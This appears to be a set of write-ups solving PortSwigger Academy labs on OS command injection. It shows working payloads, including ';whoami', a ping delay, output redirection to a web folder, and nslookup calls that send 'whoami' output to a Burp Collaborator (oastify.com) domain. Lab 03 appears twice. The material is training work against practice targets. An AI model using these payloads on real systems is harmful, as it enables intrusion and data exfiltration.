01 OS command injection, simple case
====================================

This lab contains an OS command injection vulnerability in the product stock
checker.

The application executes a shell command containing user-supplied product and
store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the
current user.

References:

-   https://portswigger.net/web-security/os-command-injection

![img](media/56feb72e170217def5df968eb9c2a1ff.png)

![img](media/412d734f58805c1c40737c534a36f3a7.png)

![img](media/3b5bf186b670bc4d3008a87a8ca52c61.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /product/stock HTTP/2
...

productId=1&storeId=1;whoami
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/c9389bd8172981e3c91406a62d3d17e0.png)

02 Blind OS command injection with time delays
==============================================

This lab contains a blind OS command injection vulnerability in the feedback
function.

The application executes a shell command containing the user-supplied details.
The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause
a 10 second delay.

References:

-   https://portswigger.net/web-security/os-command-injection

![img](media/e40a5e83ec57c6c57123b7534cee4750.png)

There is a function to submit feedback:

![img](media/527a344abf8fe28b6040e9daebc5db9a.png)

The vulnerability affects the fields “Name”, “Email” and “Message”:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"; ping -c 127.0.0.1; echo "a
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/34847cffb94e7f754d1d945a657a5439.png)

03 Blind OS command injection with output redirection
=====================================================

This lab contains a blind OS command injection vulnerability in the feedback
function.

The application executes a shell command containing the user-supplied details.
The output from the command is not returned in the response. However, you can
use output redirection to capture the output from the command. There is a
writable folder at /var/www/images/.

The application serves the images for the product catalog from this location.
You can redirect the output from the injected command to a file in this folder,
and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.

Reference: https://portswigger.net/web-security/os-command-injection

![img](media/727b4d71ce1e7a1d8ea1ad5936456bce.png)

Generated link:
https://0a19003c045b2b62809bd0800086001d.web-security-academy.net/

There is a functionality for submitting feedback:

![img](media/894f2aa6d675f02261598ab2e0e97c06.png)

And the images are retrieved with a GET request:

![img](media/8146d3bbf7490b25e710b07b5e52f7b6.png)

We need to execute:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
whoami > /var/www/images/whoami.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I sent the POST request to intruder and set 3 fields to attack in Sniper mode:

![img](media/3edafa22201fa2ff406aa55c1d123f69.png)

Then I added 3 payloads:

![img](media/3bce65e49ce68a998cef9433b0a464c7.png)

When we add payloads to the field subject the website returns an error:

![img](media/a0706edb74f3c049c7728660c2a35173.png)

We get the username “peter-5fYwD0” after a GET to "/image?filename=whoami.txt",
so the intruder attack worked:

![img](media/31c8b4be45118f80470ec66a1408c242.png)

![img](media/0b93e2ce9815936c4b0a3b34c8f9c161.png)

04 Blind OS command injection with out-of-band interaction
==========================================================

This lab contains a blind OS command injection vulnerability in the feedback
function.

The application executes a shell command containing the user-supplied details.
The command is executed asynchronously and has no effect on the application's
response. It is not possible to redirect output into a location that you can
access. However, you can trigger out-of-band interactions with an external
domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue
a DNS lookup to Burp Collaborator.

Note: To prevent the Academy platform being used to attack third parties, our
firewall blocks interactions between the labs and arbitrary external systems. To
solve the lab, you must use Burp Collaborator's default public server.

References:

-   https://portswigger.net/web-security/os-command-injection

-   https://book.hacktricks.xyz/pentesting-web/command-injection

![img](media/e98b8efa7ff9b6288c7b1cdf128c1ac3.png)

There is a function to submit feedback:

![img](media/8b1726794797b85463534a8910c6fba3.png)

In this case the command injection is achieved with the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
`nslookup 7s0qd0oqa0r71b9pewc0nu7a41asynmc.oastify.com`
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/7f26874adeb94964d521d848915ece48.png)

![img](media/d5eb36f1b89c85979f4fb0fdd5108464.png)

05 Blind OS command injection with out-of-band data exfiltration
================================================================

This lab contains a blind OS command injection vulnerability in the feedback
function.

The application executes a shell command containing the user-supplied details.
The command is executed asynchronously and has no effect on the application's
response. It is not possible to redirect output into a location that you can
access. However, you can trigger out-of-band interactions with an external
domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS
query to Burp Collaborator. You will need to enter the name of the current user
to complete the lab.

Note: To prevent the Academy platform being used to attack third parties, our
firewall blocks interactions between the labs and arbitrary external systems. To
solve the lab, you must use Burp Collaborator's default public server.

References:

-   https://portswigger.net/web-security/os-command-injection

![img](media/0b03465e894cb1b88f6bebbbde84e7ff.png)

There is a function to submit feedback. It allows out-of-band interaction with
the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$(nslookup juh2fcq2cctj3nb1g8ecp69m6dc400op.oastify.com)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/fa53eaa5f8cc5ba9c4b65a95bb48c632.png)

We get the username ("peter-0B6BNY") using the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$(nslookup `whoami`.m1o5mfx5jf0maqi4nblfw9gpdgj774vt.oastify.com)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/6634dc24d0c1e2140310537c6bfa6d6d.png)

![img](media/728f88ede2314e94cf721390d6f68a64.png)


# 22 - Blind OS command injection with output redirection

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at /var/www/images/.

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.

---------------------------------------------

Reference: https://portswigger.net/web-security/os-command-injection



![img](images/22%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection/1.png)

---------------------------------------------

Generated link: https://0a19003c045b2b62809bd0800086001d.web-security-academy.net/

There is a functionality for submitting feedback:



![img](images/22%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection/2.png)

And the images are retrieved with a GET request:



![img](images/22%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection/3.png)

We need to execute:

```
whoami > /var/www/images/whoami.txt
```

I sent the POST request to intruder and set 3 fields to attack in Sniper mode:



![img](images/22%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection/4.png)

Then I added 3 payloads:



![img](images/22%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection/5.png)

When we add payloads to the field subject the website returns an error:



![img](images/22%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection/6.png)

We get the username “peter-5fYwD0” after a GET to "/image?filename=whoami.txt", so the intruder attack worked:



![img](images/22%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection/7.png)



![img](images/22%20-%20Blind%20OS%20command%20injection%20with%20output%20redirection/8.png)
